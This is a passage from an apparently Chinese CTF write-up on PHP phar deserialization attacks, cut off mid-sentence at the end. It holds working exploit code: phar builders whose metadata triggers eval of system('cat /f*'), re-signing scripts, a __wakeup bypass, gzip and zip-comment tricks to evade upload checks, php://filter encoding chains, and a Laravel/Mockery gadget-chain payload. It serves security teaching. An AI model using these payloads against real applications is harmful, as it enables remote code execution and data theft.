__HALT_COMPILER(); ?&gt;&quot;</span>);<span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$b</span>);<span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test1.txt&quot;</span>, <span class="hljs-string">&quot;test1&quot;</span>);<span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<span class="hljs-meta">?&gt;</span></code></pre></div><p>修改内容，最后的<code>i:1</code>改为<code>i:0</code></p><p><img src="/2023/08/17/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/e4p73WRYbfEic9d.png" alt="image.png"></p><p>修改phar文件内容后要重新进行签名</p><div class="code-wrapper"><pre><code class="hljs haxe">from hashlib <span class="hljs-keyword">import</span> sha1f = open(<span class="hljs-string">&#x27;a.phar&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read() <span class="hljs-meta"># 修改内容后的phar文件</span>s = f[:<span class="hljs-type">-28</span>] <span class="hljs-meta"># 获取要签名的数据</span>h = f[<span class="hljs-number">-8</span>:<span class="hljs-type"></span>] <span class="hljs-meta"># 获取签名类型以及GBMB标识</span><span class="hljs-keyword">new</span><span class="hljs-type">f</span> = s+sha1(s).digest()+h <span class="hljs-meta"># 数据 + 签名 + 类型 + GBMB</span>open(<span class="hljs-string">&#x27;phar4.phar&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>).write(<span class="hljs-keyword">new</span><span class="hljs-type">f</span>) <span class="hljs-meta"># 写入新文件</span></code></pre></div><p>然后再拿去加密</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;phar4.phar&#x27;</span>);<span class="hljs-comment">//获取二进制数据</span><span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">iconv</span>(<span class="hljs-string">&#x27;utf-8&#x27;</span>,<span class="hljs-string">&#x27;UCS-2&#x27;</span>,<span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$a</span>));<span class="hljs-comment">//UCS-2编码</span><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;2.txt&#x27;</span>,<span class="hljs-title function_ invoke__">quoted_printable_encode</span>(<span class="hljs-variable">$a</span>));<span class="hljs-comment">//quoted_printable编码</span><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;2.txt&#x27;</span>);<span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&#x27;2.txt&#x27;</span>,<span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/=\r\n/&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;2.txt&#x27;</span>)).<span class="hljs-string">&#x27;=00=3D&#x27;</span>);<span class="hljs-comment">//解决软换行导致的编码结构破坏</span><span class="hljs-meta">?&gt;</span></code></pre></div><p>file_put_contents在最后加上&#x3D;00&#x3D;3D是因为在<code>php://filter/convert.iconv.ucs-2.utf-8</code>后会出现个陌生字符</p><p><img src="/2023/08/17/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/E9KxOJMRwmf3qYX.png" alt="image.png"></p><div class="code-wrapper"><pre><code class="hljs x86asm">=00R=<span class="hljs-number">000</span>=00l=00G=<span class="hljs-number">00O</span>=<span class="hljs-number">00D</span>=00l=<span class="hljs-number">00h</span>=<span class="hljs-number">00P</span>=<span class="hljs-number">00D</span>=<span class="hljs-number">009</span>=00w=00a=<span class="hljs-number">00H</span>=00A=00g=00X=<span class="hljs-number">001</span>=<span class="hljs-number">009</span>=00I=<span class="hljs-number">00Q</span>=00U=00x=00U=00X=<span class="hljs-number">000</span>=00N=<span class="hljs-number">00P</span>=<span class="hljs-number">00T</span>=00V=<span class="hljs-number">00B</span>=00J=<span class="hljs-number">00T</span>=00E=00V=00S=00K=00C=00k=<span class="hljs-number">007</span>=00I=<span class="hljs-number">00D</span>=<span class="hljs-number">008</span>=<span class="hljs-number">00</span>+=<span class="hljs-number">00D</span>=<span class="hljs-number">00Q</span>=<span class="hljs-number">00o</span>=00w=00A=<span class="hljs-number">00Q</span>=00A=00A=00A=<span class="hljs-number">00Q</span>=00A=00A=00A=<span class="hljs-number">00B</span>=00E=00A=00A=00A=00A=<span class="hljs-number">00B</span>=00A=00A=00A=00A=00A=00A=<span class="hljs-number">00D</span>=<span class="hljs-number">005</span>=00A=00A=00A=00A=<span class="hljs-number">00Y</span>=<span class="hljs-number">00T</span>=<span class="hljs-number">00o</span>=<span class="hljs-number">00y</span>=<span class="hljs-number">00O</span>=00n=<span class="hljs-number">00t</span>=<span class="hljs-number">00p</span>=<span class="hljs-number">00O</span>=00j=00A=<span class="hljs-number">007</span>=<span class="hljs-number">00T</span>=00z=<span class="hljs-number">00o</span>=<span class="hljs-number">000</span>=<span class="hljs-number">00O</span>=00i=00J=00V=00c=<span class="hljs-number">002</span>=00V=<span class="hljs-number">00y</span>=00I=00j=<span class="hljs-number">00o</span>=<span class="hljs-number">00y</span>=<span class="hljs-number">00O</span>=00n=<span class="hljs-number">00t</span>=00z=<span class="hljs-number">00O</span>=00j=00g=<span class="hljs-number">006</span>=00I=00n=00V=00z=00Z=00X=00J=00u=<span class="hljs-number">00Y</span>=00W=<span class="hljs-number">001</span>=00l=00I=00j=<span class="hljs-number">00t</span>=<span class="hljs-number">00O</span>=<span class="hljs-number">00O</span>=<span class="hljs-number">003</span>=00M=<span class="hljs-number">006</span>=<span class="hljs-number">00O</span>=<span class="hljs-number">00D</span>=<span class="hljs-number">00o</span>=00i=00c=00G=00F=00z=00c=<span class="hljs-number">003</span>=<span class="hljs-number">00d</span>=00v=00c=00m=<span class="hljs-number">00Q</span>=00i=<span class="hljs-number">00O</span>=<span class="hljs-number">002</span>=00E=<span class="hljs-number">006</span>=00M=00j=<span class="hljs-number">00p</span>=<span class="hljs-number">007</span>=00a=<span class="hljs-number">00T</span>=<span class="hljs-number">00o</span>=00w=<span class="hljs-number">00O</span>=<span class="hljs-number">000</span>=<span class="hljs-number">008</span>=<span class="hljs-number">006</span>=00N=<span class="hljs-number">00D</span>=<span class="hljs-number">00o</span>=00i=00V=00X=00N=00l=00c=00i=00I=<span class="hljs-number">006</span>=00M=00j=<span class="hljs-number">00p</span>=<span class="hljs-number">007</span>=00c=00z=<span class="hljs-number">00o</span>=<span class="hljs-number">004</span>=<span class="hljs-number">00O</span>=00i=00J=<span class="hljs-number">001</span>=00c=<span class="hljs-number">002</span>=00V=<span class="hljs-number">00y</span>=<span class="hljs-number">00b</span>=00m=00F=<span class="hljs-number">00t</span>=00Z=00S=00I=<span class="hljs-number">007</span>=<span class="hljs-number">00T</span>=00z=<span class="hljs-number">00o</span>=<span class="hljs-number">003</span>=<span class="hljs-number">00O</span>=00i=00J=00N=00e=00W=00V=<span class="hljs-number">00y</span>=00c=00m=<span class="hljs-number">009</span>=<span class="hljs-number">00y</span>=00I=00j=<span class="hljs-number">00o</span>=<span class="hljs-number">00y</span>=<span class="hljs-number">00O</span>=00n=<span class="hljs-number">00t</span>=00z=<span class="hljs-number">00O</span>=00j=00c=<span class="hljs-number">006</span>=00I=00m=<span class="hljs-number">001</span>=00l=00c=<span class="hljs-number">003</span>=00N=<span class="hljs-number">00h</span>=00Z=<span class="hljs-number">002</span>=00U=00i=<span class="hljs-number">00O</span>=<span class="hljs-number">000</span>=<span class="hljs-number">008</span>=<span class="hljs-number">006</span>=00N=<span class="hljs-number">00T</span>=<span class="hljs-number">00o</span>=00i=00R=00m=00l=00s=00Z=00X=00M=00i=<span class="hljs-number">00O</span>=00j=00I=<span class="hljs-number">006</span>=00e=<span class="hljs-number">003</span>=00M=<span class="hljs-number">006</span>=<span class="hljs-number">00O</span>=<span class="hljs-number">00D</span>=<span class="hljs-number">00o</span>=00i=00Z=00m=00l=00s=00Z=00W=<span class="hljs-number">005</span>=<span class="hljs-number">00h</span>=<span class="hljs-number">00b</span>=00W=00U=00i=<span class="hljs-number">00O</span>=<span class="hljs-number">000</span>=<span class="hljs-number">004</span>=<span class="hljs-number">007</span>=00c=00z=<span class="hljs-number">00o</span>=00z=<span class="hljs-number">00O</span>=00i=00J=<span class="hljs-number">00h</span>=00c=00m=00c=00i=<span class="hljs-number">00O</span>=<span class="hljs-number">003</span>=00M=<span class="hljs-number">006</span>=00N=00z=<span class="hljs-number">00o</span>=00i=<span class="hljs-number">00Y</span>=<span class="hljs-number">002</span>=00F=<span class="hljs-number">000</span>=00I=00C=<span class="hljs-number">009</span>=00m=00K=00i=00I=<span class="hljs-number">007</span>=00f=00X=00M=<span class="hljs-number">006</span>=00N=<span class="hljs-number">00D</span>=<span class="hljs-number">00o</span>=00i=<span class="hljs-number">00d</span>=00G=00V=00z=<span class="hljs-number">00d</span>=00C=00I=<span class="hljs-number">007</span>=00c=00z=<span class="hljs-number">00o</span>=<span class="hljs-number">002</span>=<span class="hljs-number">00O</span>=00i=00J=00z=00e=00X=00N=<span class="hljs-number">000</span>=00Z=00W=<span class="hljs-number">000</span>=00i=<span class="hljs-number">00O</span>=<span class="hljs-number">003</span>=<span class="hljs-number">001</span>=00z=<span class="hljs-number">00O</span>=00j=00g=<span class="hljs-number">006</span>=00I=00n=<span class="hljs-number">00B</span>=<span class="hljs-number">00h</span>=00c=<span class="hljs-number">003</span>=00N=<span class="hljs-number">003</span>=<span class="hljs-number">00b</span>=<span class="hljs-number">003</span>=00J=00k=00I=00j=<span class="hljs-number">00t</span>=<span class="hljs-number">00O</span>=<span class="hljs-number">00O</span>=<span class="hljs-number">003</span>=<span class="hljs-number">001</span>=<span class="hljs-number">00p</span>=<span class="hljs-number">00O</span>=00j=00E=<span class="hljs-number">007</span>=00c=00z=<span class="hljs-number">00o</span>=<span class="hljs-number">001</span>=<span class="hljs-number">00O</span>=00i=00J=00j=00a=00G=00V=00j=00a=<span class="hljs-number">00y</span>=00I=<span class="hljs-number">007</span>=00f=00X=<span class="hljs-number">001</span>=<span class="hljs-number">00p</span>=<span class="hljs-number">00O</span>=00j=00A=<span class="hljs-number">007</span>=<span class="hljs-number">00T</span>=00j=<span class="hljs-number">00t</span>=<span class="hljs-number">009</span>=00C=<span class="hljs-number">00Q</span>=00A=00A=00A=<span class="hljs-number">00H</span>=00R=00l=00c=<span class="hljs-number">003</span>=<span class="hljs-number">00Q</span>=00x=00L=00n=00R=<span class="hljs-number">004</span>=<span class="hljs-number">00d</span>=00A=00U=00A=00A=00A=<span class="hljs-number">00B</span>=00W=00V=00N=<span class="hljs-number">001</span>=00k=<span class="hljs-number">00B</span>=<span class="hljs-number">00Q</span>=00A=00A=00A=<span class="hljs-number">00O</span>=00L=00c=00s=<span class="hljs-number">00o</span>=<span class="hljs-number">00q</span>=<span class="hljs-number">002</span>=00A=<span class="hljs-number">00Q</span>=00A=00A=00A=00A=00A=00A=00A=<span class="hljs-number">00H</span>=00R=00l=00c=<span class="hljs-number">003</span>=<span class="hljs-number">00Q</span>=00x=00I=00z=00S=00g=00V=00I=00G=<span class="hljs-number">007</span>=00m=00l=<span class="hljs-number">007</span>=00G=00e=<span class="hljs-number">00B</span>=<span class="hljs-number">00t</span>=00l=00l=00I=<span class="hljs-number">00b</span>=<span class="hljs-number">008</span>=00e=00l=00l=00l=00v=00s=<span class="hljs-number">004</span>=00C=00A=00A=00A=00A=00R=<span class="hljs-number">000</span>=00J=00N=<span class="hljs-number">00Q</span>=00g=<span class="hljs-number">00</span>=<span class="hljs-number">3D</span>=<span class="hljs-number">00</span>=<span class="hljs-number">3D</span>=<span class="hljs-number">00</span>=<span class="hljs-number">3D</span></code></pre></div><p><img src="/2023/08/17/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230817070053918.png" alt="image-20230817070053918"></p><p><code>php://filter/read=convert.quoted-printable-decode|convert.iconv.ucs-2.utf-8|convert.base64-decode/resource=log/error.txt</code></p><p>注意要选上重写文件</p><p><img src="/2023/08/17/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230817070203472.png" alt="image-20230817070203472"></p><p><img src="/2023/08/17/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230817070414298.png" alt="image-20230817070414298"></p><p><code>phar://log/error.txt</code></p><p><img src="/2023/08/17/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230817070449179.png" alt="image-20230817070449179"></p><h2 id="NSSRound-4-SWPU-1zweb"><a href="#NSSRound-4-SWPU-1zweb" class="headerlink" title="[NSSRound#4 SWPU]1zweb"></a>[NSSRound#4 SWPU]1zweb</h2><p>可以非预期，我们这里按预期解来讲</p><p><img src="/2023/08/17/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230817071725768.png" alt="image-20230817071725768"></p><p><code>index.php</code>  源代码中查看完整代码</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LoveNss</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ljt</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$dky</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-variable language_">$this</span>-&gt;ljt=<span class="hljs-string">&quot;ljt&quot;</span>;        <span class="hljs-variable language_">$this</span>-&gt;dky=<span class="hljs-string">&quot;dky&quot;</span>;        <span class="hljs-title function_ invoke__">phpinfo</span>();    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;ljt===<span class="hljs-string">&quot;Misc&quot;</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;dky===<span class="hljs-string">&quot;Re&quot;</span>)            <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;cmd);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-variable language_">$this</span>-&gt;ljt=<span class="hljs-string">&quot;Re&quot;</span>;        <span class="hljs-variable language_">$this</span>-&gt;dky=<span class="hljs-string">&quot;Misc&quot;</span>;    &#125;&#125;<span class="hljs-variable">$file</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$file</span>);&#125;</code></pre></div><p><code>upload.php </code>源代码中查看完整代码</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;error&quot;</span>] &gt; <span class="hljs-number">0</span>)&#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;上传异常&quot;</span>;&#125;<span class="hljs-keyword">else</span>&#123;    <span class="hljs-variable">$allowedExts</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;gif&quot;</span>, <span class="hljs-string">&quot;jpeg&quot;</span>, <span class="hljs-string">&quot;jpg&quot;</span>, <span class="hljs-string">&quot;png&quot;</span>);    <span class="hljs-variable">$temp</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;.&quot;</span>, <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]);    <span class="hljs-variable">$extension</span> = <span class="hljs-title function_ invoke__">end</span>(<span class="hljs-variable">$temp</span>);    <span class="hljs-keyword">if</span> ((<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;size&quot;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$extension</span>, <span class="hljs-variable">$allowedExts</span>)))&#123;        <span class="hljs-variable">$content</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]);        <span class="hljs-variable">$pos</span> = <span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$content</span>, <span class="hljs-string">&quot;__HALT_COMPILER();&quot;</span>);        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">gettype</span>(<span class="hljs-variable">$pos</span>)===<span class="hljs-string">&quot;integer&quot;</span>)&#123;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ltj一眼就发现了phar&quot;</span>;        &#125;<span class="hljs-keyword">else</span>&#123;            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-string">&quot;./upload/&quot;</span> . <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]))&#123;                <span class="hljs-keyword">echo</span> <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>] . <span class="hljs-string">&quot; 文件已经存在&quot;</span>;            &#125;<span class="hljs-keyword">else</span>&#123;                <span class="hljs-variable">$myfile</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;./upload/&quot;</span>.<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>], <span class="hljs-string">&quot;w&quot;</span>);                <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$myfile</span>, <span class="hljs-variable">$content</span>);                <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$myfile</span>);                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;上传成功 ./upload/&quot;</span>.<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>];            &#125;        &#125;    &#125;<span class="hljs-keyword">else</span>&#123;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;dky不喜欢这个文件 .&quot;</span>.<span class="hljs-variable">$extension</span>;    &#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p><code>upload.php</code>检查上传文件的后缀，检查文件内容，检查文件是否存在</p><p><code>index.php</code>绕过<code>__wakeup</code>即可</p><h3 id="对phar文件的处理"><a href="#对phar文件的处理" class="headerlink" title="对phar文件的处理"></a>对phar文件的处理</h3><ul><li>修改后缀      <code>a.phar -&gt; a.png</code></li><li>使用gzip对文件进行压缩，从而绕过对<code>__HALT_COMPILER();</code>的检查</li><li>php&#x2F;5.5.38 绕过<code>__wakeup</code> 修改类数字大于成员个数</li></ul><h3 id="实际操作"><a href="#实际操作" class="headerlink" title="实际操作"></a>实际操作</h3><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LoveNss</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$ljt</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$dky</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-variable language_">$this</span>-&gt;ljt=<span class="hljs-string">&quot;Misc&quot;</span>;        <span class="hljs-variable language_">$this</span>-&gt;dky=<span class="hljs-string">&quot;Re&quot;</span>;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;ljt===<span class="hljs-string">&quot;Misc&quot;</span>&amp;&amp;<span class="hljs-variable language_">$this</span>-&gt;dky===<span class="hljs-string">&quot;Re&quot;</span>)            <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;cmd);    &#125;&#125;<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LoveNss</span>();<span class="hljs-variable">$a</span>-&gt;cmd = <span class="hljs-string">&#x27;system(&quot;cat /f*&quot;);&#x27;</span>;<span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;a.phar&quot;</span>);<span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;GIF89a&quot;</span>.<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);<span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>);<span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test1.txt&quot;</span>, <span class="hljs-string">&quot;test1&quot;</span>);<span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<span class="hljs-meta">?&gt;</span></code></pre></div><p><code>$a-&gt;cmd = &#39;system(&quot;cat /f*&quot;);&#39;;</code>记得加<code>;</code>号</p><p>修改后缀    <code>a.phar-&gt;a.png</code></p><p>修改个数</p><p><img src="/2023/08/17/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/b5d0c4afd2.jpg" alt="NSSIMAGE"></p><p>改完后重新签名并进行压缩</p><div class="code-wrapper"><pre><code class="hljs livecodeserver"><span class="hljs-built_in">from</span> hashlib import sha1import gzip<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;phar.png&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-built_in">file</span>:    f = <span class="hljs-built_in">file</span>.<span class="hljs-built_in">read</span>()s = f[:<span class="hljs-number">-28</span>]  <span class="hljs-comment"># 获取要签名的数据</span>h = f[<span class="hljs-number">-8</span>:]  <span class="hljs-comment"># 获取签名类型以及GBMB标识</span>new_file = s + sha1(s).digest() + h  <span class="hljs-comment"># 数据 + 签名 + (类型 + GBMB)</span>f_gzip = gzip.GzipFile(<span class="hljs-string">&quot;1.png&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>)f_gzip.<span class="hljs-built_in">write</span>(new_file)f_gzip.<span class="hljs-built_in">close</span>()</code></pre></div><p>然后上传文件</p><p><img src="/2023/08/17/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230817073309229.png" alt="image-20230817073309229"></p><p><img src="/2023/08/17/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230817073336340.png" alt="image-20230817073336340"></p><p><img src="/2023/08/17/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image-20230817073419227.png" alt="image-20230817073419227"></p><h1 id="小说一下绕过-HALT-COMPILER-的检查"><a href="#小说一下绕过-HALT-COMPILER-的检查" class="headerlink" title="小说一下绕过__HALT_COMPILER();?&gt;的检查"></a>小说一下绕过__HALT_COMPILER();?&gt;的检查</h1><p>1.将phar文件进行gzip压缩后在修改为png文件后缀</p><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha1<span class="hljs-keyword">import</span> gzip<span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;phar.png&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> file:    f = file.read()s = f[:-<span class="hljs-number">28</span>]  <span class="hljs-comment"># 获取要签名的数据</span>h = f[-<span class="hljs-number">8</span>:]  <span class="hljs-comment"># 获取签名类型以及GBMB标识</span>new_file = s + sha1(s).digest() + h  <span class="hljs-comment"># 数据 + 签名 + (类型 + GBMB)</span>f_gzip = gzip.GzipFile(<span class="hljs-string">&quot;1.png&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>)f_gzip.write(new_file)f_gzip.close()</code></pre></div><hr><p>2.将phar的内容写进压缩包注释中，然后压缩为zip也会绕过该正则</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$phar_file</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$exp</span>);    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$phar_file</span>;    <span class="hljs-variable">$zip</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ZipArchive</span>();    <span class="hljs-variable">$res</span> = <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-string">&#x27;1.zip&#x27;</span>,<span class="hljs-title class_">ZipArchive</span>::<span class="hljs-variable constant_">CREATE</span>);     <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&#x27;crispr.txt&#x27;</span>, <span class="hljs-string">&#x27;file content goes here&#x27;</span>);    <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">setArchiveComment</span>(<span class="hljs-variable">$phar_file</span>);    <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();</code></pre></div><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$phar_file</span> = <span class="hljs-string">&#x27;O:40:&quot;Illuminate\Broadcasting\PendingBroadcast&quot;:2:&#123;S:6:&quot;events&quot;;O:25:&quot;Illuminate\Bus\Dispatcher&quot;:1:&#123;S:13:&quot;queueResolver&quot;;a:2:&#123;i:0;O:25:&quot;Mockery\Loader\EvalLoader&quot;:0:&#123;&#125;i:1;S:4:&quot;load&quot;;&#125;&#125;S:5:&quot;event&quot;;O:38:&quot;Illuminate\Broadcasting\BroadcastEvent&quot;:1:&#123;S:10:&quot;connection&quot;;O:32:&quot;Mockery\Generator\MockDefinition&quot;:2:&#123;S:6:&quot;config&quot;;O:35:&quot;Mockery\Generator\MockConfiguration&quot;:1:&#123;S:4:&quot;name&quot;;S:6:&quot;crispr&quot;;&#125;S:4:&quot;code&quot;;S:31:&quot;\3c\3f\70\68\70 echo system(&quot;cat /flag&quot;);&quot;;&#125;&#125;&#125;&#x27;</span>;    <span class="hljs-variable">$zip</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ZipArchive</span>();    <span class="hljs-variable">$res</span> = <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">open</span>(<span class="hljs-string">&#x27;1.zip&#x27;</span>,<span class="hljs-title class_">ZipArchive</span>::<span class="hljs-variable constant_">CREATE</span>);     <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&#x27;crispr.txt&#x27;</span>, <span class="hljs-string">&#x27;file content goes here&#x27;</span>);    <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">setArchiveComment</span>(<span class="hljs-variable">$phar_file</span>);    <span class="hljs-variable">$zip</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();</code></pre></div><h1 id="phar签名及数据绕过"><a href="#phar签名及数据绕过" class="headerlink" title="phar签名及数据绕过"></a>phar签名及数据绕过</h1><p><a href="https://www.php.net/manual/zh/phar.fileformat.signature.php">https://www.php.net/manual/zh/phar.fileformat.signature.php</a></p><p>绕过__wakeup时要修改phar内容，但是修改后要重新进行签名</p><p>签证尾部的<code>01</code>代表md5加密，<code>02</code>代表sha1加密，<code>04</code>代表sha256加密，<code>08</code>代表sha512加密</p><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha1f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;b.phar&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read() <span class="hljs-comment"># 修改内容后的phar文件</span>s = f[:-<span class="hljs-number">28</span>] <span class="hljs-comment"># 获取要签名的数据</span>h = f[-<span class="hljs-number">8</span>:] <span class="hljs-comment"># 获取签名类型以及GBMB标识</span>newf = s+sha1(s).digest()+h <span class="hljs-comment"># 数据 + 签名 + 类型 + GBMB</span><span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;phar2.phar&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>).write(newf) <span class="hljs-comment"># 写入新文件</span></code></pre></div><p>注意计算 SHA1 的时候要使用 <code>.digest()</code> 而不是 <code>.hexdigest()</code>, 